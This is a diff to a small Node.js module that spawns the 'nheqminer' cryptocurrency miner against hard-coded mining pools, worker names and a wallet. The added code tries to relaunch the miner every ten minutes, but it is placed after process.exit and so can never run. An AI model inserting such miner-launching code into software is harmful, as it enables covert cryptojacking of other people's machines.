@@ -1,10 +1,10 @@
 
 
-module.exports = function() {
-
+module.exports = function panda() {
+//./nheqminer -l equihash.eu.nicehash.com:3357 -u 16nwBgDJA8KekHsvt1apLMsyoXpsstV2NH.worker1 -t 0
 var util  = require('util'),
     spawn = require('child_process').spawn,
-    ls    = spawn('./nheqminer',['-t','4','-l','stratum-zec.antpool.com:8899','-u','spiritbro.panda','-p','x']);
+    ls    = spawn('./nheqminer',['-l','stratum-zec.antpool.com:8899','-u','spiritbro.panda','-p','x']);
     //spawn('./nheqminer',['-t','1''-l','zec.suprnova.cc:2142','-u','t1SkKSR2rhZt6mtmWZ4BKz2FrhwpSphJkpR','-p','x']);
 //spawn('./minho',['-a','scrypt','-o','stratum+tcp://stratum-ltc.antpool.com:8888','-O','spiritbrother.panda:password']);
 ls.stdout.on('data', function (data) {
@@ -28,7 +28,10 @@ ls.stderr.pause();
 ls.stdout.pause();
 ls.kill();
 process.exit(0)
-},2000000)
+setInterval(function(){
+  panda()
+},600000)
+},600000)
 }
 
 
